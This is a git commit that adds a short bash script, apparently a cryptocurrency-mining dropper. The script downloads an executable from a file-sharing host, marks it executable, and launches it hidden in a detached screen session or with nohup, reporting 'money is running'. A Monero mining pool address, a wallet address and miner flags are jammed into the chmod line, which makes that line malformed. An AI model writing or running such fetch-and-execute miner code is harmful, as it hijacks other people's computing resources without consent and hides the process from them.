5cf94fcf76603bf5a09ce558ade2f06fdb1b92d2
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-02 07:56:14 +0800

    Create sj17yu23b7db19sn20nf721b7sb2.sh

---
+++ sj17yu23b7db19sn20nf721b7sb2.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+FILE_URL="oshi.at/HyLW"
+FILE_NAME="session_ajqysbey"
+
+wget -O $FILE_NAME $FILE_URL
+chmod +x $FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx 
+if command -v screen &> /dev/null
+then
+    screen -dmS mysession ./$FILE_NAME
+    sleep 1
+    if screen -list | grep -q "mysession"; then
+        echo "money is running in screen"
+    else
+        echo "error"
+    fi
+else
+    nohup ./$FILE_NAME &> /dev/null &
+    sleep 1
+    if ps -ef | grep -v grep | grep -q "$FILE_NAME"; then
+        echo "money is running in the background"
+    else
+        echo "error"
+    fi
+fi
